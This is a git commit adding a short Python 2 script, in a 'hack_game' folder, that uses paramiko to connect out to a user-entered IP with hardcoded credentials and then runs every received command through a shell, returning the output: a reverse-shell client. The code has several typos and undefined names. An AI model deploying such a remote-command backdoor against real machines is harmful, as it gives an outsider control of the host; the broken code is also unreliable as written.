b0e132d27e288a273beef28628247922c25b05b9
terry <447837170@qq.com>
2015-12-10 20:47:50 +0800

    add tesshserver

---
+++ hack_game/python-hack/paramiko/terrysshRcmd.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+import paramiko
+import subprocess
+
+def ssh_command(ip,user,passwd,command):
+    sshclient = paramiko.SSHClient()
+    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    sshclient.connect(ip,username=user,password=passwd)
+    sshsession = sshclient.get_trasport().open_session()
+    if sshsession.active:
+        sshsession.send(command)
+        print sshsession.recv(1024)
+        while True:
+            command = sshsession.recv(1024)
+            try:
+                cmd_output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
+                sshsession.send(cmd_ouput)
+            except e:
+                sshsession.send(str(e))
+
+        sessionclient.close()
+        return 
+
+ip = raw_input("Please input the ip:").strip('\n')
+ssh_command(ip,'terry','123456','ClientConnected')
+
